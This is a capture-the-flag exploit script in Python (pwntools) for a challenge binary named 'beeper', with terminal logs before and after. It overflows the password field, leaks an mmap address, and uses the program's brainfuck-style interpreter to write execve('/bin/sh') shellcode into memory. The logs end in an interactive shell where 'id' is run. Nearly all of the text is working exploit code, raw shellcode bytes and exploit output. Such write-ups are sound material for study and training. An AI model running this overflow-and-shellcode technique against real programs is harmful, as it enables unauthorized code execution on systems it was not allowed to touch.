'''
parallels@ubuntu:/media/psf/Home/writeup/ctf/nictf$ (python -c 'print "\x86\x13\x81\x09\x62\xff\x44\xd3\x3f\xcd\x19\xb0\xfb\x88\xfd\xae\x20\xdf"+"1"*(112-18)+"\x00"';cat) | ./beeper
Homura Beeper,plz login!
password:
welcome!
1.Show the message.
2.Remove the message.
3.Buy a cell phone.
4.Logout.
choice>>
'''
from pwn import *

r = process('./beeper')

s = lambda x:r.send(str(x))
sl = lambda x:r.sendline(str(x))
c0 = lambda : r.recvuntil('>>')
c1 = lambda : r.recvuntil('remove?')
c2 = lambda : r.recvuntil(', number:')

password = "\x86\x13\x81\x09\x62\xff\x44\xd3\x3f\xcd\x19\xb0\xfb\x88\xfd\xae\x20\xdf"
password += "1"*(112-18)
password += "\x00"

r.recvuntil('password:')
sl(password)
c0()

# Leak Mmap Address
sl(2)
c1()
sl(1)
c0()
sl(2)
c1()
sl(2)
c0()
sl(2)
c1() 
sl(1)
c0()

# Leak Mmap Address in 1
sl(1)
c2()
sl(1)
r.recvuntil('number:')
mmap_address = u64(r.recvuntil('\n').replace('\n',''))
log.success('Mmap Address : %s'%(hex(mmap_address)))

# Overwrite Mmap Address using brainfuck.
new_data = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
ori_data = (p64(0x2434810120646f68)+p64(0x7975b84801010101)+p64(0x48506f6870206120)+p64(0x20746f6e206e61b8))[:len(new_data)]

for idx in range(0,4):
    c_new_data = new_data[11*idx:11*(idx+1)]
    c_ori_data = ori_data[11*idx:11*(idx+1)]
    c0()
    sl(4)
    payload = "\x86\x13\x81\x09\x62\xff\x44\xd3\x3f\xcd\x19\xb0\xfb\x88\xfd\xae\x20\xdf" # Password
    payload += "1"*(104-18) # Dummy
    payload += p64(mmap_address+idx*11) # Target
    #####################
    # Generate BF OP
    #  case 'h':
    #        ++Maybe_Overwrite;
    #        ++idx;
    #        break;
    #  case 'm':
    #        ++*(_BYTE *)Maybe_Overwrite;
    #        ++idx;
    #        break;
    #  case 'u':
    #        --*(_BYTE *)Maybe_Overwrite;
    #        ++idx;
    #        break;
    bf = ''
    for (i,j) in zip(c_new_data,c_ori_data):
        if ord(i) > ord(j):
            bf += 'm'*(ord(i)-ord(j))+'h'
        elif ord(i) < ord(j):
            bf += 'u'*(ord(j)-ord(i))+'h'
        else:
            bf += 'h'
    # End
    ######################
    payload += bf
    payload += "\x00" # End
    r.recvuntil('password:')
    sl(payload)

r.interactive()



'''
[+] Starting local process './beeper': pid 28466
[+] Mmap Address : 0x28d51000
[*] Switching to interactive mode

1.Show the message.
2.Remove the message.
3.Buy a cell phone.
4.Logout.
choice>>$ 3
$ id
uid=1000(parallels) gid=1000(parallels) groups=1000(parallels),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$
'''